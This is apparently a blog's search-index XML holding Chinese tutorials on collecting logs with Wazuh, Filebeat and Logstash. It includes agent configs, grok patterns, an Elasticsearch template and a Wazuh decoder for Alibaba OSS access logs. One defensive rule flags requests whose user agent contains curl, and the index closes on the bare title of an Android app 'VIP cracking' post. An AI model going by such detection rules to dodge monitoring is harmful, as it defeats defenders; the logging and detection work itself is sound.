<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Wazuh 日志采集 总结篇</title>
      <link href="/2025/07/26/wazuh-ri-zhi-cai-ji-zong-jie-pian/"/>
      <url>/2025/07/26/wazuh-ri-zhi-cai-ji-zong-jie-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="1-概览"><a href="#1-概览" class="headerlink" title="1.概览"></a>1.概览</h1><p>目前看到的wazuh日志采集方式如下，后文将对每一种方式做一个大概讲解及测试</p><table><thead><tr><th align="left"><strong>收集方式</strong></th><th align="left"><strong>配置示例</strong></th><th align="left"><strong>适用场景</strong></th><th align="left"><strong>支持格式</strong></th><th align="left"><strong>备注</strong></th></tr></thead><tbody><tr><td align="left"><strong>本地日志文件监控</strong></td><td align="left"><code>&lt;localfile&gt;&lt;location&gt;/var/log/example.log&lt;/location&gt;&lt;log_format&gt;syslog&lt;/log_format&gt;&lt;/localfile&gt;</code></td><td align="left">Linux/Windows 日志文件</td><td align="left"><code>syslog</code>、<code>json</code>、<code>plaintext</code></td><td align="left">支持通配符（<code>*.log</code>）和动态文件名（<code>log-%Y-%m-%d.log</code>）</td></tr><tr><td align="left"><strong>Windows事件日志</strong></td><td align="left"><code>&lt;localfile&gt;&lt;location&gt;Security&lt;/location&gt;&lt;log_format&gt;eventlog&lt;/log_format&gt;&lt;/localfile&gt;</code></td><td align="left">Windows 安全日志、应用日志</td><td align="left"><code>eventlog</code>（传统日志）</td><td align="left">适用于监控登录、权限变更等安全事件</td></tr><tr><td align="left"><strong>Windows事件通道</strong></td><td align="left"><code>&lt;localfile&gt;&lt;location&gt;Microsoft-Windows-PowerShell/Operational&lt;/location&gt;&lt;log_format&gt;eventchannel&lt;/log_format&gt;&lt;/localfile&gt;</code></td><td align="left">Windows 系统/应用事件通道</td><td align="left"><code>eventchannel</code></td><td align="left">适用于监控 PowerShell、打印服务等高级日志</td></tr><tr><td align="left"><strong>远程Syslog接收</strong></td><td align="left"><code>&lt;remote&gt;&lt;connection&gt;syslog&lt;/connection&gt;&lt;allowed-ips&gt;192.168.1.0/24&lt;/allowed-ips&gt;&lt;/remote&gt;</code></td><td align="left">防火墙、路由器、交换机等网络设备</td><td align="left"><code>syslog</code>（UDP/TCP）</td><td align="left">需配置防火墙允许514/1514端口</td></tr><tr><td align="left"><strong>JSON日志解析</strong></td><td align="left"><code>&lt;localfile&gt;&lt;log_format&gt;json&lt;/log_format&gt;&lt;location&gt;/var/log/app.json&lt;/location&gt;&lt;/localfile&gt;</code></td><td align="left">现代应用（如Docker、K8s、Suricata）</td><td align="left"><code>json</code></td><td align="left">支持嵌套字段，自动提取关键字段</td></tr><tr><td align="left"><strong>命令输出收集</strong></td><td align="left"><code>&lt;localfile&gt;&lt;log_format&gt;full_command&lt;/log_format&gt;&lt;command&gt;df -h&lt;/command&gt;&lt;frequency&gt;300&lt;/frequency&gt;&lt;/localfile&gt;</code></td><td align="left">系统状态监控（磁盘、进程、网络）</td><td align="left">命令行输出</td><td align="left">可定时执行（<code>frequency</code> 单位为秒）</td></tr><tr><td align="left"><strong>REST API 提交</strong></td><td align="left"><code>POST /events HTTP/1.1</code>（发送至 <code>http://wazuh-server:55000/events</code>）</td><td align="left">自定义脚本、云服务日志</td><td align="left"><code>json</code></td><td align="left">需认证（API密钥或JWT）</td></tr><tr><td align="left"><strong>Unix Socket 注入</strong></td><td align="left"><code>echo '{"log":"test"}' &gt; /var/ossec/queue/sockets/queue</code></td><td align="left">高性能本地日志注入</td><td align="left"><code>json</code>/<code>plaintext</code></td><td align="left">需确保Wazuh有socket写入权限</td></tr><tr><td align="left"><strong>中间件扩展（API网关）</strong></td><td align="left">自定义HTTP服务（如Python Flask + Wazuh API）</td><td align="left">云服务（AWS、Azure）、Webhook</td><td align="left"><code>json</code></td><td align="left">适用于复杂日志转换和批量提交</td></tr></tbody></table><h1 id="2-本地日志"><a href="#2-本地日志" class="headerlink" title="2.本地日志"></a>2.本地日志</h1><h2 id="2-1本地日志文件"><a href="#2-1本地日志文件" class="headerlink" title="2.1本地日志文件"></a>2.1本地日志文件</h2><p>本部分内容可以参考 <a href="https://blog.161695.xyz/2025/07/23/logstatsh-shi-yong-grok-cai-ji-ri-zhi/#toc-heading-5">https://blog.161695.xyz/2025/07/23/logstatsh-shi-yong-grok-cai-ji-ri-zhi/#toc-heading-5</a> 中的 Wazuh部分， 收集本地的日志文件。</p><h2 id="2-2本地事件日志"><a href="#2-2本地事件日志" class="headerlink" title="2.2本地事件日志"></a>2.2本地事件日志</h2><p>本部分内容可以参考 <a href="https://blog.161695.xyz/2023/10/11/soc-es7/#toc-heading-17">https://blog.161695.xyz/2023/10/11/soc-es7/#toc-heading-17</a> 中的</p>]]></content>
      
      
      
        <tags>
            
            <tag> elk </tag>
            
            <tag> wazuh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>logstatsh/wazuh采集日志</title>
      <link href="/2025/07/23/logstatshwazuh-cai-ji-ri-zhi/"/>
      <url>/2025/07/23/logstatshwazuh-cai-ji-ri-zhi/</url>
      
        <content type="html"><![CDATA[<p>本文以 阿里云 <a href="https://www.alibabacloud.com/help/zh/oss/user-guide/logging">https://www.alibabacloud.com/help/zh/oss/user-guide/logging</a> oss-accesslog 为例，</p><p>记录两种方法解析该日志</p><pre class="language-none"><code class="language-none">192.168.0.1 - - [03/Jan/2021:14:59:49 +0800] "GET /example.jpg HTTP/1.0" 200 999131 127 "http://www.aliyun.com/product/oss" "curl/7.15.5" "examplebucket.oss-cn-hangzhou.aliyuncs.com" "5FF16B65F05BC932307A3C3C" "true" "16571836914537****" "GetObject" "examplebucket" "example.jpg" 999131 88 "-" 302 "16571836914537****" - "cdn" "standard" "-" "-" "LTAI****************"</code></pre><h1 id="1-Filebeat-logstatsh"><a href="#1-Filebeat-logstatsh" class="headerlink" title="1.Filebeat + logstatsh"></a>1.Filebeat + logstatsh</h1><p>使用 filebeat 采集，转发到 logstatsh 进行解析拆字段，以下是配置文件</p><h2 id="1Filebeat"><a href="#1Filebeat" class="headerlink" title="1Filebeat:"></a>1Filebeat:</h2><pre class="language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">filebeat.inputs</span><span class="token punctuation">:</span><span class="token punctuation">-</span> <span class="token key atrule">type</span><span class="token punctuation">:</span> log  <span class="token key atrule">enabled</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">paths</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"G:\\oss-logs2\\*.log"</span><span class="token punctuation">]</span>  <span class="token key atrule">fields_under_root</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">fields</span><span class="token punctuation">:</span>    <span class="token key atrule">log_type</span><span class="token punctuation">:</span> ossaccesslog<span class="token key atrule">output.logstash</span><span class="token punctuation">:</span>  <span class="token key atrule">hosts</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"127.0.0.1:5044"</span><span class="token punctuation">]</span></code></pre><h2 id="2-Logstatsh"><a href="#2-Logstatsh" class="headerlink" title="2 Logstatsh:"></a>2 Logstatsh:</h2><pre class="language-json" data-language="json"><code class="language-json">input <span class="token punctuation">{</span>  beats <span class="token punctuation">{</span>    port =&gt; <span class="token number">5044</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>filter <span class="token punctuation">{</span>  # 如果你的日志是JSON格式，可以这样解析  if <span class="token punctuation">[</span>message<span class="token punctuation">]</span> =~ /^<span class="token punctuation">{</span>.*<span class="token punctuation">}</span>$/ <span class="token punctuation">{</span>    json <span class="token punctuation">{</span>      source =&gt; <span class="token string">"message"</span>      target =&gt; <span class="token string">"json_content"</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  # 对于普通文本日志，可以使用grok模式解析  grok <span class="token punctuation">{</span>    match =&gt; <span class="token punctuation">{</span> <span class="token string">"message"</span> =&gt; '%<span class="token punctuation">{</span>IPORHOST<span class="token operator">:</span>client_ip<span class="token punctuation">}</span> %<span class="token punctuation">{</span>USER<span class="token operator">:</span>ident<span class="token punctuation">}</span> %<span class="token punctuation">{</span>USER<span class="token operator">:</span>auth<span class="token punctuation">}</span> \<span class="token punctuation">[</span>%<span class="token punctuation">{</span>HTTPDATE<span class="token operator">:</span>timestamp<span class="token punctuation">}</span>\<span class="token punctuation">]</span> <span class="token string">"%{WORD:method} %{URIPATHPARAM:request} HTTP/%{NUMBER:http_version}"</span> %<span class="token punctuation">{</span>NUMBER<span class="token operator">:</span>status_code<span class="token punctuation">}</span> %<span class="token punctuation">{</span>NUMBER<span class="token operator">:</span>bytes_sent<span class="token punctuation">}</span> %<span class="token punctuation">{</span>NUMBER<span class="token operator">:</span>response_time<span class="token punctuation">}</span> <span class="token string">"%{DATA:referrer}"</span> <span class="token string">"%{DATA:user_agent}"</span> <span class="token string">"%{DATA:host}"</span> <span class="token string">"%{DATA:request_id}"</span> <span class="token string">"%{DATA:cache_hit}"</span> <span class="token string">"%{DATA:ssl_protocol}"</span> <span class="token string">"%{DATA:operation}"</span> <span class="token string">"%{DATA:bucket}"</span> <span class="token string">"%{DATA:key}"</span> %<span class="token punctuation">{</span>NUMBER<span class="token operator">:</span>object_size<span class="token punctuation">}</span> %<span class="token punctuation">{</span>NUMBER<span class="token operator">:</span>server_time<span class="token punctuation">}</span> <span class="token string">"%{DATA:error_code}"</span> %<span class="token punctuation">{</span>NUMBER<span class="token operator">:</span>request_length<span class="token punctuation">}</span> <span class="token string">"%{DATA:request_id_2}"</span> %<span class="token punctuation">{</span>DATA<span class="token operator">:</span>signature<span class="token punctuation">}</span> <span class="token string">"%{DATA:storage_class}"</span> <span class="token string">"%{DATA:version_id}"</span> <span class="token string">"%{DATA:requester}"</span>' <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  #https<span class="token operator">:</span><span class="token comment">//grokdebugger.com/</span>  # 日期处理  date <span class="token punctuation">{</span>    match =&gt; <span class="token punctuation">[</span><span class="token string">"timestamp"</span><span class="token punctuation">,</span> <span class="token string">"dd/MMM/yyyy:HH:mm:ss Z"</span><span class="token punctuation">]</span>    locale =&gt; <span class="token string">"en"</span>    target =&gt; <span class="token string">"@timestamp"</span>    timezone =&gt; <span class="token string">"Asia/Shanghai"</span>  <span class="token punctuation">}</span>  # 移除不需要的字段  mutate <span class="token punctuation">{</span>    remove_field =&gt; <span class="token punctuation">[</span><span class="token string">"beat"</span><span class="token punctuation">,</span> <span class="token string">"input"</span><span class="token punctuation">,</span> <span class="token string">"source"</span><span class="token punctuation">,</span> <span class="token string">"offset"</span><span class="token punctuation">,</span> <span class="token string">"prospector"</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span>  # 可选：同时输出到控制台用于调试output <span class="token punctuation">{</span>  elasticsearch <span class="token punctuation">{</span>    hosts =&gt; <span class="token punctuation">[</span><span class="token string">"http://192.168.137.134:9200"</span><span class="token punctuation">]</span>    index =&gt; <span class="token string">"ossaccesslogs-%{+YYYY.MM.dd}"</span>    template_name =&gt; <span class="token string">"oss_access_logs_template"</span>    template_overwrite =&gt; <span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="3-ES创建对应的index-template"><a href="#3-ES创建对应的index-template" class="headerlink" title="3 ES创建对应的index template:"></a>3 ES创建对应的index template:</h2><pre class="language-json" data-language="json"><code class="language-json">PUT _index_template/oss_access_logs_template<span class="token punctuation">{</span>  <span class="token property">"index_patterns"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"oss-access-logs-*"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"template"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"settings"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"number_of_shards"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>      <span class="token property">"number_of_replicas"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>      <span class="token property">"index.lifecycle.name"</span><span class="token operator">:</span> <span class="token string">"oss_logs_policy"</span><span class="token punctuation">,</span>      <span class="token property">"index.codec"</span><span class="token operator">:</span> <span class="token string">"best_compression"</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token property">"mappings"</span><span class="token operator">:</span> <span class="token punctuation">{</span>      <span class="token property">"dynamic"</span><span class="token operator">:</span> <span class="token string">"strict"</span><span class="token punctuation">,</span>      <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"client_ip"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"ip"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"timestamp"</span><span class="token operator">:</span> <span class="token punctuation">{</span>           <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"date"</span><span class="token punctuation">,</span>          <span class="token property">"format"</span><span class="token operator">:</span> <span class="token string">"strict_date_optional_time||epoch_millis"</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"method"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"request"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span> <span class="token property">"fields"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"keyword"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"http_version"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"status_code"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"integer"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"bytes_sent"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"long"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"response_time"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"long"</span><span class="token punctuation">,</span> <span class="token property">"doc_values"</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"referrer"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"user_agent"</span><span class="token operator">:</span> <span class="token punctuation">{</span>           <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span>          <span class="token property">"fields"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"keyword"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span><span class="token punctuation">,</span> <span class="token property">"ignore_above"</span><span class="token operator">:</span> <span class="token number">1024</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"host"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"request_id"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"cache_hit"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"boolean"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"ssl_protocol"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"operation"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"bucket"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"key"</span><span class="token operator">:</span> <span class="token punctuation">{</span>           <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"text"</span><span class="token punctuation">,</span>          <span class="token property">"fields"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"path"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"object_size"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"long"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"server_time"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"long"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"geoip"</span><span class="token operator">:</span> <span class="token punctuation">{</span>          <span class="token property">"properties"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"country_name"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"keyword"</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"location"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"geo_point"</span> <span class="token punctuation">}</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>先启动 logstatsh:</p><pre class="language-none"><code class="language-none">logstash -f G:\tools\logstash-7.17.13\config\my.conf</code></pre><p>在启动 filebeat:</p><pre class="language-none"><code class="language-none">filebeat.exe -e</code></pre><p>ES创建对应的Index patterns，可以在discover 中看到正确解析，并且使用该时间作为date排序</p><p><img src="/assets/image-20250723142732059.png" alt="image-20250723142732059"></p><h1 id="2-Wazuh"><a href="#2-Wazuh" class="headerlink" title="2.Wazuh"></a>2.Wazuh</h1><p>使用 wazuh agent 读取文件发送到wazuh-manager，使用wazuh来进行decoder和rule编写</p><h2 id="1-配置agent-conf-of-windows-group"><a href="#1-配置agent-conf-of-windows-group" class="headerlink" title="1. 配置agent.conf of windows group"></a>1. 配置agent.conf of windows group</h2><p>首先配置采集agent log， 需要文件具有可读权限</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>agent_config</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>localfile</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>log_format</span><span class="token punctuation">&gt;</span></span>syslog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>log_format</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>location</span><span class="token punctuation">&gt;</span></span>C:\Users\admin\AppData\Local\Temp\test.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>location</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>localfile</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>agent_config</span><span class="token punctuation">&gt;</span></span></code></pre><h2 id="2-编写对应的decoder"><a href="#2-编写对应的decoder" class="headerlink" title="2. 编写对应的decoder"></a>2. 编写对应的decoder</h2><p>wazuh支持两种正则语法，OSRegex(更快但不支持回溯等操作) 和 PCRE2.</p><p><a href="https://regex101.com/">https://regex101.com/</a> 可在该网站调试 PCRE2 正则语法，bin/wazuh-regex 测试OSRegex语法</p><p>先使用wazuh-logtest 工具测试该日志，发现会当做 web-accesslog 进行decoder，并且自己在local_decoder.xml 里面编写的decoder无论是新增还是继承 web-accesslog 均无法执行。(所以最好还是syslog 日志好，带有program name 方便识别日志类型)</p><p><img src="/assets/image-20250725131751002.png" alt="image-20250725131751002"></p><p>考虑原因，应该是 <code>0375-web-accesslog_decoders.xml</code> 执行优先级最高，匹配到日志前段符合就使用decoder 执行了。</p><p>(此处另一种方法，可以重写 <code>0375-web-accesslog_decoders.xml</code> 文件，参考<a href="https://blog.161695.xyz/2023/10/11/soc-es7/#toc-heading-14">https://blog.161695.xyz/2023/10/11/soc-es7/#toc-heading-14</a> 3.修改已有decoder)</p><p>如果想要当成新的decoder，需要在<code>/var/ossec/etc/decoders</code> 创建了文件 <code>0374-ali-oss-accesslog_decoders.xml</code>，这样优先级会比<code>0375-web-accesslog_decoders.xml</code> 更高</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoder</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>alicloud_oss_access_log<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">&gt;</span></span>web-log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>prematch</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(\S+) (\S+) (\S+) \[([^\]]+)\] "([A-Z]+) ([^ ]+) (HTTP\/[^"]+)" (\d+) (\d+) (\d+) "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" (\d+) (\d+) "([^"]*)" (\d+) "([^"]*)" (\S+) "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)"$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>prematch</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>regex</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pcre2<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>^(\S+) (\S+) (\S+) \[([^\]]+)\] "([A-Z]+) ([^ ]+) (HTTP\/[^"]+)" (\d+) (\d+) (\d+) "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" (\d+) (\d+) "([^"]*)" (\d+) "([^"]*)" (\S+) "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)" "([^"]*)"$<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>regex</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>order</span><span class="token punctuation">&gt;</span></span>srcip, keepfield1, keepfield2, datetime, httpmethod, url, httpversion, status, SentBytes, RequestTime, Referer, UserAgent, HostName, RequestID, LoggingFlag, RequesterAliyunID, action, BucketName, ObjectName, ObjectSize, ServerCostTime, ErrorCode, RequestLength, user, DeltaDataSize, SyncRequest, StorageClass, TargetStorageClass, TransmissionAccelerationAccessPoint, AccessKeyID<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>order</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoder</span><span class="token punctuation">&gt;</span></span></code></pre><p>重启wazuh， 并更新文件内容。 这样获取到的日志就会被解析到各个字段上</p><p><img src="/assets/image-20250725120856439.png" alt="image-20250725120856439"></p><p>测试编写rule</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>group</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>aliosslog<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rule</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>100400<span class="token punctuation">"</span></span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>6<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>if_sid</span><span class="token punctuation">&gt;</span></span>31100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>if_sid</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>decoded_as</span><span class="token punctuation">&gt;</span></span>alicloud_oss_access_log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>decoded_as</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UserAgent<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>\.*curl\.*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>field</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>$(srcip) try to use curl request: $(UserAgent).<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rule</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>group</span><span class="token punctuation">&gt;</span></span></code></pre><p>在 wazuh-alerts 中可以查到触发告警</p><p><img src="/assets/image-20250725144618467.png" alt="image-20250725144618467"></p><p>但是，会发现存在以下问题：</p><ol><li>除了wazuh的静态字段以外， 动态的字段都是 keywords类型，无法计算</li><li>时间戳不对，使用的是wazuh存储日志的时间</li></ol><h2 id="3-增加字段mapping并重建索引"><a href="#3-增加字段mapping并重建索引" class="headerlink" title="3. 增加字段mapping并重建索引"></a>3. 增加字段mapping并重建索引</h2><p>时间格式可在该文档查询 “<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.17/date.html&quot;">https://www.elastic.co/guide/en/elasticsearch/reference/7.17/date.html"</a></p><p>可在ES中验证格式是否正确</p><pre class="language-xml" data-language="xml"><code class="language-xml">GET _validate/query?format=yaml{  "query": {    "range": {      "timestamp": {        "gte": "05/Jul/2025:14:00:00 +0800",        "lte": "05/Jul/2025:15:00:00 +0800",        "format": "dd/MMM/yyyy:HH:mm:ss Z"      }    }  }}</code></pre><p><img src="/assets/image-20250725162232921.png" alt="image-20250725162232921"></p><p>在wazuh 索引的templates中添加对应字段(如果没加对，日志进不去)</p><p>此处需要将数字设置为long， 才能存储比较大的数字。 后面在Index patterns中再设置成 bytes 即可</p><p><img src="/assets/image-20250725154551321.png" alt="image-20250725154551321"></p><p><img src="/assets/image-20250725162940332.png" alt="image-20250725162940332"></p><p>再重建索引，正常显示 datetime和sentbytes</p><p><img src="/assets/image-20250725163026877.png" alt="image-20250725163026877"></p>]]></content>
      
      
      
        <tags>
            
            <tag> elk </tag>
            
            <tag> wazuh </tag>
            
            <tag> filebeat </tag>
            
            <tag> logstatsh </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓软件VIP破解</title>
      <link href="/2025/07/20/an-zhuo-ruan-jian-po-jie/"/>
      <url>/2025/07/20/an-zhuo-ruan-jian-po-jie/</url>
      
